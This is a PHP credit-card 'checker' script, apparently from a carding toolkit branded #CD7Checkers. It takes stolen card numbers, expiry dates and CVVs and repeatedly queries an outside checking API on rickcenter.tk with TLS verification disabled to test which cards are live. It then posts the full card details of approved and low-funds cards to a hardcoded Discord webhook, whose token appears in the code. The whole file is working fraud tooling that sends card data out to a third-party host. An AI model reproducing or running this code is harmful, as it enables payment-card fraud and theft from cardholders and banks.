<?php
error_reporting(0);
set_time_limit(0);
$lista = $_GET["lista"];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

function bin($cartao){
        $contents = file_get_contents("bins.csv");
        $pattern = preg_quote(substr($cartao, 0, 6), '/');
        $pattern = "/^.*$pattern.*\$/m";
        if (preg_match_all($pattern, $contents, $matches)) {
            $encontrada = implode("\n", $matches[0]);
        }
        $pieces = explode(";", $encontrada);
        return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 $r0 = curl_exec($ch);

$retorno = getStr2($r0, '</td><td>Retorno:','</td>');


if(strpos($r0, 'Aprovada ✅')) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	$r0 = curl_exec($ch);
	$retorno = getStr2($r0, '</td><td>Retorno:','</td>');
	if(strpos($r0, 'Aprovada ✅')) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		$r0 = curl_exec($ch);
		$retorno = getStr2($r0, '</td><td>Retorno:','</td>');
		if(strpos($r0, 'Aprovada ✅')) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			$r0 = curl_exec($ch);
			$retorno = getStr2($r0, '</td><td>Retorno:','</td>');
			if(strpos($r0, 'Aprovada ✅')) {
				echo '<span class="badge badge-success">Livezinha</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Transação Aprovada.</span> -> BIN: <span class="badge badge-primary">'.$bin.'</span> -> <span class="badge badge-dark">#CD7Checkers</span>';
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/webhooks/854848834496364556/_xtyazQ1Rk2ZungJ0O0bNry9QNJt4ctYGZpT7CQNAH3reXhzJ2wM2KeBAvhAPsm_txFg");
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_HTTPHEADER, array(
				'content-type: application/json',
				'origin: https://mrpowergamerbr.com/',
				'referer: https://mrpowergamerbr.com/projects/discord-webhooks',
				'sec-fetch-dest: empty',
				'sec-fetch-mode: cors',
				'sec-fetch-site: cross-site',
				'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'));
				curl_setopt($ch, CURLOPT_POSTFIELDS, '{"content":"```✓ Aprovada ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ BIN ➜ '.$bin.' ➜ (00) SUCCESS!```"}');
				$resposta12 = curl_exec($ch);
			} else {
				echo '<span class="badge badge-danger">Reprovada</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Cartão Recusado.</span> - <span class="badge badge-dark">#CD7Checkers</span>';
			}
		} else {
			echo '<span class="badge badge-danger">Reprovada</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Cartão Recusado.</span> - <span class="badge badge-dark">#CD7Checkers</span>';
		}
	}else{
		echo '<span class="badge badge-danger">Reprovada</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Cartão Recusado.</span> - <span class="badge badge-dark">#CD7Checkers</span>';
	}
}
elseif(strpos($r0, 'Unauthorized. Insufficient funds')) {
  echo '<span class="badge badge-danger">Reprovada</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Cartão Recusado.</span> -> BIN: <span class="badge badge-primary">'.$bin.'</span> -> <span class="badge badge-dark">#CD7Checkers</span>';
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/webhooks/854848834496364556/_xtyazQ1Rk2ZungJ0O0bNry9QNJt4ctYGZpT7CQNAH3reXhzJ2wM2KeBAvhAPsm_txFg");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-type: application/json',
  'origin: https://mrpowergamerbr.com/',
  'referer: https://mrpowergamerbr.com/projects/discord-webhooks',
  'sec-fetch-dest: empty',
  'sec-fetch-mode: cors',
  'sec-fetch-site: cross-site',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'));
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"content":"```✓ Aprovada ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ BIN ➜ '.$bin.' ➜ (111) SALDO INSUFICIENTE!```"}');
  $resposta12 = curl_exec($ch);
}
elseif(strpos($r0, 'Unauthorized. Identified moderate risk by the issuer')) {
  echo '<span class="badge badge-danger">Reprovada</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Cartão Bloqueado.</span> -> BIN: <span class="badge badge-primary">'.$bin.'</span> -> <span class="badge badge-dark">#CD7Checkers</span>';
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/webhooks/854848834496364556/_xtyazQ1Rk2ZungJ0O0bNry9QNJt4ctYGZpT7CQNAH3reXhzJ2wM2KeBAvhAPsm_txFg");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-type: application/json',
  'origin: https://mrpowergamerbr.com/',
  'referer: https://mrpowergamerbr.com/projects/discord-webhooks',
  'sec-fetch-dest: empty',
  'sec-fetch-mode: cors',
  'sec-fetch-site: cross-site',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'));
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"content":"```✓ Aprovada ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ BIN ➜ '.$bin.' ➜ (113) GERADA!```"}');
  $resposta12 = curl_exec($ch);
}elseif(strpos($r0, 'invalid')){
  echo '<span class="badge badge-warning">Invalido</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Cartao Inválido</span> - <span class="badge badge-dark">#CD7Checkers</span>';
}else{
  echo '<span class="badge badge-danger">Reprovada</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Cartão Recusado.</span> - <span class="badge badge-dark">#CD7Checkers</span>';
}

?>
